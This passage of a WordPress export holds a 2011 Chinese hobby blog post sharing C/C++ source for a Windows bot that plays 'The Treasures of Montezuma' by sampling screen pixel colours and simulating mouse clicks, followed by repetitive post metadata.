		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"217";s:6:"height";s:3:"277";s:14:"hwstring_small";s:22:"height='96' width='75'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/00/2E/wKgKC03E3KoAAAAAAAAM2VyJYxE862.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"147";s:6:"height";s:3:"188";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/00/77/wKgKCk3E3KoAAAAAAAAi0DeeiLA208.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/00/77/wKgKCk3E3KoAAAAAAABBaRsLsQg563.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>自动玩《蒙特祖玛的宝藏》的东东</title>
		<link>http://codemylife.blogcn.com/2011/05/%e8%87%aa%e5%8a%a8%e7%8e%a9%e3%80%8a%e8%92%99%e7%89%b9%e7%a5%96%e7%8e%9b%e7%9a%84%e5%ae%9d%e8%97%8f%e3%80%8b%e7%9a%84%e4%b8%9c%e4%b8%9c/</link>
		<pubDate>Sat, 07 May 2011 06:03:16 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[Windows]]></category>

		<category domain="category" nicename="windows"><![CDATA[Windows]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=32</guid>
		<description></description>
		<content:encoded><![CDATA[上篇讲了最近做了一个屏幕取点工具，这次是捣鼓的自动玩《蒙特祖玛的宝藏》的东东，仅用于v1.06。原理很简单：对屏幕进行取点，识别出是何种方块，然后将能移动后能消去的方块入队列，再模拟鼠标点击。做这个是为了练手，习惯了在公司代码的基础上做东西，这样从无到有的写代码是另外一番乐趣！
首先是main函数，很简单。
<pre class="c">#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#include "LookForDiamond.h"
</br>
int main(int argc, char* argv[])
{
    CLookForDiamond* theApp = new CLookForDiamond;
    bool ret = theApp-&gt;InitInstance((HINSTANCE)GetModuleHandle(NULL));
    if (ret == true) {
        theApp-&gt;SetWindowInfo("The Treasures of Montezuma");
	theApp-&gt;Run();
    }
    delete theApp;
    return 0;
}</pre>
下面是CLookForDiamond类头文件：
<pre class="cpp">#ifndef _LOOKFORDIAMOND_H
#define _LOOKFORDIAMOND_H
#include "common.h"
#include "WindowPointPixel.h"
</br>
struct _stMouseClick {
    stPointI pt1;
    stPointI pt2;
    _stMouseClick&amp; operator = (_stMouseClick&amp; stMc)
    {
        pt1 = stMc.pt1;
        pt2 = stMc.pt2;
        return *this;
    }
};
</br>
class CLookForDiamond
{
public:
    CLookForDiamond();
    ~CLookForDiamond();
</br>
    bool InitInstance(HINSTANCE hInstance);
    void Run();
    void UpdateDiamondInfo();
    void SetWindowInfo(const char* strWindowName);
    void CaclTheSampleColor(stPointI pt[GridNum][GridNum], COLORREF clr[GridNum][GridNum]);
    inline void AutoClick();
    void SearchClickPoint();
    inline void TryMoveGrid(int x, int y);
    inline bool IsCanClearGrid(int x, int y);
    static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
private:
    static HWND m_hWnd;			    //本窗口句柄
    static std::string m_strDestWindowName;//目标窗口标题
    static HWND m_hDestWnd;		   //目标窗口句柄
    POINT m_WindowPos;			   //目标窗口位置
</br>
    bool m_IsNeedUpdate;	//是否需要更新
    bool m_IsShowMouseClick;	//是否显示鼠标点击
    static bool m_IsStartRun;	//是否开始运行
</br>
    DWORD m_StartTime;		//更新时间
    DWORD m_DiamondInfo[GridNum][GridNum];//当前格子状态
    COLORREF m_GirdClr[GridNum][GridNum];    //采样颜色
    stPointI m_GridPoint[GridNum][GridNum];    //采样点位置
</br>
    std::deque&lt;_stMouseClick&gt; m_ClickQueue;//保存鼠标可点坐标序列
};
</br>
#endif</pre>
下面是CLookForDiamond类实现文件：
<pre class="c">#include &lt;stdio.h&gt;
#include &lt;deque&gt;
#include "resource.h"
#include "common.h"
#include "WindowPointPixel.h"
#include "LookForDiamond.h"
</br>
#define KEY_DOWN(vk_code) ((GetAsyncKeyState(vk_code) &amp; 0x8000) ? 1 : 0)
</br>
bool CLookForDiamond::m_IsStartRun = false;
HWND CLookForDiamond::m_hWnd = NULL;
HWND CLookForDiamond::m_hDestWnd = NULL;
std::string CLookForDiamond::m_strDestWindowName;
</br>
CLookForDiamond::CLookForDiamond()
: m_StartTime(0)
, m_IsShowMouseClick(false)
, m_IsNeedUpdate(true)
{
    memset(m_DiamondInfo, 0, sizeof(m_DiamondInfo));
    memset(m_GirdClr, 0, sizeof(m_GirdClr));
    memset(m_GridPoint, 0, sizeof(m_GridPoint));
}
CLookForDiamond::~CLookForDiamond()
{
</br>
}
</br>
LRESULT CALLBACK CLookForDiamond::WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    PAINTSTRUCT ps;
    HDC hdc;
</br>
    switch(msg)
    {
        case WM_COMMAND:
	    if (LOWORD(wParam) == IDC_START)
	    {
	        m_IsStartRun = ! m_IsStartRun;
	        if (m_IsStartRun) {
	        SetWindowText(GetDlgItem(m_hWnd, IDC_START), "停止");
	        HWND hwnd = FindWindow(NULL, m_strDestWindowName.c_str());
	        if (hwnd != NULL) {
		    m_hDestWnd = hwnd;
	        }
	    }
            else
		SetWindowText(GetDlgItem(m_hWnd, IDC_START), "启动");
	    }
	    return 0;
	case WM_PAINT:
	    {
		hdc = BeginPaint(hwnd, &amp;ps);
		EndPaint(hwnd, &amp;ps);
		return 0;
	    }
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}
</br>
bool CLookForDiamond::InitInstance(HINSTANCE hInstance)
{
    static char szAppName[] = "LookforDiamond";
    WNDCLASS wc;
</br>
    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc = WndProc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = DLGWINDOWEXTRA;
    wc.hInstance = hInstance;
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
    wc.lpszMenuName = NULL;
    wc.lpszClassName = szAppName;
</br>
    if (!RegisterClass(&amp;wc)) {
	MessageBox(NULL, "This program requires windows NT!", szAppName, MB_ICONERROR);
	return false;
    }
</br>
    m_hWnd = CreateDialog(hInstance, szAppName, 0, NULL);
</br>
    ShowWindow(m_hWnd, SW_SHOW);
    return true;
}
void CLookForDiamond::Run()
{
    MSG msg;
</br>
    while (true) {
        if (PeekMessage(&amp;msg, NULL, 0, 0, PM_REMOVE)) {
	    if (msg.message == WM_QUIT)
	        break;
</br>
	    TranslateMessage(&amp;msg);
	    DispatchMessage(&amp;msg);
	}
	else {
	    DWORD NowTime = GetTickCount();
	    if (/*NowTime - m_StartTime &gt; 2000 &amp;&amp;*/ m_IsStartRun) {
	        m_StartTime = NowTime;
		//if (m_IsNeedUpdate) {
		    UpdateDiamondInfo();
		    SearchClickPoint();
		    //m_IsNeedUpdate = false;
		//}
		if (m_ClickQueue.empty() == false)
		    AutoClick();
		else
		    m_IsNeedUpdate = true;

		if (KEY_DOWN(VK_ESCAPE)) {
		    m_IsStartRun = false;
		    SetWindowText(GetDlgItem(m_hWnd, IDC_START), "启动");
		}
	    }
	    else {
	       Sleep(0);
	    }
	}
    }
}
</br>
void CLookForDiamond::SetWindowInfo(const char* strWindowName)
{
    m_strDestWindowName = strWindowName;
}
</br>
void CLookForDiamond::UpdateDiamondInfo()
{
    //计算采样坐标点
    CaclTheSamplePoint(m_GridPoint);
    //采样color
    CaclTheSampleColor(m_GridPoint, m_GirdClr);

    for (int i = 0; i &lt; GridNum; i++)
    {
	for (int j = 0; j &lt; GridNum; j++)
	{
	    IsWhichGrid(m_GirdClr[i][j],m_DiamondInfo[i][j]);
#ifdef _DEBUG
	    printf("%d ", m_DiamondInfo[i][j]);
#endif
	}
#ifdef _DEBUG
        printf("\n");
#endif
    }
}
void CLookForDiamond::CaclTheSampleColor(stPointI pt[GridNum][GridNum], COLORREF clr[GridNum][GridNum])
{
#ifdef _DEBUG
    char szPixelInfo[512] = {0};
    char szTemp[64] = {0};
#endif
</br>
    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hwnd);
    RECT rect;
    GetWindowRect(m_hDestWnd, &amp;rect);
    DWORD AverValue[3] = {0,0,0};
</br>
    for (int i = 0; i &lt; GridNum; i++)	//取8*8个格子样点
    {
	for (int j = 0; j &lt; GridNum; j++)
	{
	    if (pt[i][j] == stPointI(0, 0))
		continue;
</br>
	    stPointI ptCore = pt[i][j] + stPointI(rect.left, rect.top);
</br>
	    //每个样点取9个点计算均值
	    for (int k = 1, xOffset = -1, yOffset = -1; k &lt;= 9; k++) {
                stPointI ptTemp = ptCore + stPointI(xOffset, yOffset);
                COLORREF clrTemp = GetPixel(hdc, ptTemp.x, ptTemp.y);
                DWORD rValue = GetRValue(clrTemp);
                DWORD gValue = GetGValue(clrTemp);
                DWORD bValue = GetBValue(clrTemp);
                AverValue[0] += rValue;
                AverValue[1] += gValue;
                AverValue[2] += bValue;
                if (k % 3 == 0) {
                    xOffset = -1;
                    yOffset++;
                }
                else {
                    xOffset++;
                }
            }
            AverValue[0] /= 9;
            AverValue[1] /= 9;
            AverValue[2] /= 9;
            clr[i][j] = RGB(AverValue[0], AverValue[1], AverValue[2]);
#ifdef _DEBUG
            _snprintf(szTemp, sizeof(szTemp), "(%d,%d,%d) ", AverValue[0], AverValue[1], AverValue[2]);
            strcat(szPixelInfo, szTemp);
#endif
        }
#ifdef _DEBUG
        printf("%s\n", szPixelInfo);
        memset(szPixelInfo, 0, sizeof(szPixelInfo));
#endif
    }
}
inline void CLookForDiamond::AutoClick()
{
    srand(GetTickCount());
    int size = m_ClickQueue.size();
    int pos = rand() % size;
    _stMouseClick stMc = m_ClickQueue.at(pos);
</br>
    RECT rect;
    GetWindowRect(m_hDestWnd, &amp;rect);
</br>
    stPointI pt1 = stMc.pt1 + stPointI(rect.left, rect.top);
    stPointI pt2 = stMc.pt2 + stPointI(rect.left, rect.top);
</br>
    SetCursorPos(pt1.x, pt1.y);
    PostMessage(m_hDestWnd, WM_LBUTTONDOWN, 0, MAKELONG(pt1.x, pt1.y));
    Sleep(100);
    SetCursorPos(pt2.x, pt2.y);
    PostMessage(m_hDestWnd, WM_LBUTTONDOWN, 0, MAKELONG(pt2.x, pt2.y));
</br>
    m_ClickQueue.erase(m_ClickQueue.begin() + pos);
}
inline bool CLookForDiamond::IsCanClearGrid(int x, int y)
{
    bool ret = false;
    DWORD type = m_DiamondInfo[x][y];
</br>
    //左1 A 右1
    if (y &gt; 0 &amp;&amp; y &lt; GridNum - 1) {
	ret = (type == m_DiamondInfo[x][y-1] &amp;&amp; 
            type == m_DiamondInfo[x][y+1]);
	if (ret)
	    return true;
    }
</br>
    //左2 左1 A
    if (y &gt; 1) {
	ret = (type == m_DiamondInfo[x][y-2] &amp;&amp; 
            type == m_DiamondInfo[x][y-1]);
	if (ret)
	   return true;
    }
</br>
    //A 右1 右2
    if (y &lt; GridNum - 2) {
	ret = (type == m_DiamondInfo[x][y+1] &amp;&amp; 
            type == m_DiamondInfo[x][y+2]);
	if (ret)
	    return true;
    }
</br>
    //上1 A 下1
    if (x &gt; 0 &amp;&amp; x &lt; GridNum - 1) {
	ret = (type == m_DiamondInfo[x-1][y] &amp;&amp; 
            type == m_DiamondInfo[x+1][y]);
	if (ret)
	    return true;
    }
</br>
    //上2 上1 A
    if (x &gt; 1) {
	ret = (type == m_DiamondInfo[x-2][y] &amp;&amp; 
            type == m_DiamondInfo[x-1][y]);
	if (ret)
	    return true;
    }
</br>
    //A 下1 下2
    if (y &lt; GridNum - 2) {
	ret = (type == m_DiamondInfo[x+1][y] &amp;&amp; 
            type == m_DiamondInfo[x+2][y]);
	if (ret)
	    return true;
    }
</br>
    return false;
}
inline void CLookForDiamond::TryMoveGrid(int x, int y)
{
    /* x 行 y 列，根据queue数据保存方式。所以这里 x y与window 窗口坐标不同
    (0,0)	|——Y——
		|
		|X
    */
    stPointI ptOffset[4] = {stPointI(-1, 0), stPointI(0, -1), stPointI(1, 0), stPointI(0, 1)};
    int _x = 0, _y = 0;
    _stMouseClick stMC;
</br>
    if (x != 0)	{			//上
        _x = x + ptOffset[0].x;
	_y = y + ptOffset[0].y;
	swap(m_DiamondInfo[x][y], m_DiamondInfo[_x][_y]);
	bool ret = IsCanClearGrid( _x, _y);
	swap(m_DiamondInfo[x][y], m_DiamondInfo[_x][_y]);
	if (ret) {
	    stMC.pt1 = m_GridPoint[x][y];
	    stMC.pt2 = m_GridPoint[_x][_y];
	    m_ClickQueue.push_back(stMC);
	    return;
	}
    }
</br>
    if (y != 0) {			//左
	_x = x + ptOffset[1].x;
	_y = y + ptOffset[1].y;
	swap(m_DiamondInfo[x][y], m_DiamondInfo[_x][_y]);
	bool ret = IsCanClearGrid( _x, _y);
	swap(m_DiamondInfo[x][y], m_DiamondInfo[_x][_y]);
	if (ret) {
	    stMC.pt1 = m_GridPoint[x][y];
	    stMC.pt2 = m_GridPoint[_x][_y];
	    m_ClickQueue.push_back(stMC);
	    return;
	}
    }
</br>
    if (x != GridNum - 1) {		//下
	_x = x + ptOffset[2].x;
	_y = y + ptOffset[2].y;
	swap(m_DiamondInfo[x][y], m_DiamondInfo[_x][_y]);
	bool ret = IsCanClearGrid( _x, _y);
	swap(m_DiamondInfo[x][y], m_DiamondInfo[_x][_y]);
	if (ret) {
	    stMC.pt1 = m_GridPoint[x][y];
	    stMC.pt2 = m_GridPoint[_x][_y];
	    m_ClickQueue.push_back(stMC);
	    return;
	}
    }
</br>
    if (y != GridNum - 1) {		//右
	_x = x + ptOffset[3].x;
	_y = y + ptOffset[3].y;
	swap(m_DiamondInfo[x][y], m_DiamondInfo[_x][_y]);
	bool ret = IsCanClearGrid( _x, _y);
	swap(m_DiamondInfo[x][y], m_DiamondInfo[_x][_y]);
	if (ret) {
	    stMC.pt1 = m_GridPoint[x][y];
	    stMC.pt2 = m_GridPoint[_x][_y];
	    m_ClickQueue.push_back(stMC);
	    return;
	}
    }
}
</br>
void CLookForDiamond::SearchClickPoint()
{
    if (m_ClickQueue.empty() == false)
	m_ClickQueue.clear();
</br>
    for (int i = 0; i &lt; GridNum; i++)
    {
	for (int j = 0; j &lt; GridNum; j++)
	{
	    TryMoveGrid(i, j);
	}
    }
}</pre>
保存所取像素点头文件
<pre class="c">#ifndef _WINDOWPOINTPIXEL_H
#define _WINDOWPOINTPIXEL_H
</br>
//基线
#define BasePt		stPointI(424, 113)//基准点
#define GridWidth 	83		  //格子长
#define GridHeight	83		  //格子宽
#define PixelPoint	21		  //取点宽度(83/4)
</br>
//方块 1/2高 1/4宽
#define GridNum		8
#define GreenGridAverClr  RGB(75,169,84)  //绿色方块取样点 type = 1
#define BlueGridAverClr	  RGB(65,97,171)  //蓝色方块取样点 type = 2
#define PurpleGridAverClr RGB(120,57,146) //紫色方块取样点 type = 3
#define RedGridAverClr	  RGB(168,35,61)  //红色方块取样点 type = 4
#define OrangeGridAverClr RGB(200, 81,6)  //橙色方块取样点 type = 5
#define WhiteGridAverClr  RGB(202,196,160)//白色方块取样点 type = 6
#define YellowGridAverClr RGB(211,174,31) //黄色方块取样点 type = 7
#define BlackGridAverClr  RGB(71,80,80)	  //黑色方块取样点 type = 8
</br>
//方块判断
</br>
#define DifferGirdMax(grid, clr, ret) \
{\
    int RValue = GetRValue(grid) - GetRValue(clr);\
    int GValue = GetGValue(grid) - GetGValue(clr);\
    int BValue = GetBValue(grid) - GetBValue(clr);\
    ret = max(max(abs(RValue), abs(GValue)), abs(BValue));\
}
</br>
#define IsWhichGrid(clr, _type) \
{ \
    int  clrValue[9]; \
    DifferGirdMax(GreenGridAverClr, clr, clrValue[1]); \
    DifferGirdMax(BlueGridAverClr,  clr, clrValue[2]); \
    DifferGirdMax(PurpleGridAverClr,clr, clrValue[3]); \
    DifferGirdMax(RedGridAverClr,   clr, clrValue[4]); \
    DifferGirdMax(OrangeGridAverClr,clr, clrValue[5]); \
    DifferGirdMax(WhiteGridAverClr, clr, clrValue[6]); \
    DifferGirdMax(YellowGridAverClr,clr, clrValue[7]); \
    DifferGirdMax(BlackGridAverClr, clr, clrValue[8]); \
    long temp = 0xffffff; \
    for (size_t k = 1; k &lt;= GridNum; k++) \
    { \
	if (clrValue[k] &lt; temp) { \
	    temp = clrValue[k]; \
	    _type = k; \
	} \
    } \
}
</br>
//点采样坐标计算
#define CaclTheSamplePoint(data) \
{ \
    for (int i = 0, yOffset = 0; i &lt; GridNum; i++, yOffset += GridHeight) \
    { \
	stPointI ptOffset(0, yOffset); \
	for (int j = 0, xOffset = 0; j &lt; GridNum; j++, xOffset += GridWidth) \
	{ \
	    if (j == 0) { \
		xOffset = -GridWidth; \
	    } \
	    ptOffset.x = xOffset; \
	    data[i][j] = BasePt + ptOffset; \
	} \
    } \
}
#endif</pre>
common.h文件定义了通用操作
<pre class="c">
#ifndef _COMMON_H
#define _COMMON_H
#include <windef.h>
</br>
template<class T>
inline void swap(T& a, T& b)
{
    T tmp;
    tmp = a;
    a = b;
    b = tmp;
}
</br>
class stPointI : public tagPOINT
{
public:
    stPointI(){}
    stPointI(long _x, long _y)
    {
	x = _x;
	y = _y;
    }
    stPointI(POINT& pt)
    {
	x = pt.x;
	y = pt.y;
    }
    POINT operator + (const POINT& pt)
    {
        POINT ret;
	ret.x = x + pt.x;
	ret.y = y + pt.y;
	return ret;
    }
    POINT operator - (const POINT& pt)
    {
	POINT ret;
	ret.x = x - pt.x;
	ret.y = y - pt.y;
	return ret;
    }
    POINT& operator = (const POINT& pt)
    {
	x = pt.x;
	y = pt.y;
	return *this;
    }
    POINT& operator -= (const POINT& pt)
    {
	x -= pt.x;
	y -= pt.y;
	return *this;
    }
    POINT& operator += (const POINT& pt)
    {
	x += pt.x;
	y += pt.y;
	return *this;
    }
    bool operator == (const POINT& pt)
    {
	if (x == pt.x && y == pt.y)
	    return true;
	else
	    return false;
    }
    bool operator != (const POINT& pt)
    {
	if (x != pt.x || y != pt.y)
	    return true;
	else
	    return false;
    }
};
</br>
#endif
</pre>
代码插件不给力啊，手动调实在太痛苦了，希望以后找个能上传代码的地方，给个链接就行了。这样文章里只贴少量的代码。
总结一下，实现了基本功能，未优化。取点上有不足，那就是对于含有宝石的方块，由于宝石发光，导致取点错误。在游戏后面的关卡中错误的影响越来越明显（含有宝石的方块增多）。曾尝试对其进行优化，取中心点，但是结果不理想，优化失败。或许更好的方案是直接读取该程序内存中的数据（方块布局的数据）。以后再说吧，捣鼓这个宝藏就告一段落了！
最后给张截图：
<img src="http://files.blogcn.com/wp04/M00/00/54/wKgKDE3E_ckAAAAAAAFqfBLkSps232.jpg" alt="lookfordiamond" />]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>32</wp:post_id>
		<wp:post_date>2011-05-07 14:03:16</wp:post_date>
		<wp:post_date_gmt>2011-05-07 06:03:16</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e8%87%aa%e5%8a%a8%e7%8e%a9%e3%80%8a%e8%92%99%e7%89%b9%e7%a5%96%e7%8e%9b%e7%9a%84%e5%ae%9d%e8%97%8f%e3%80%8b%e7%9a%84%e4%b8%9c%e4%b8%9c</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343359340]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
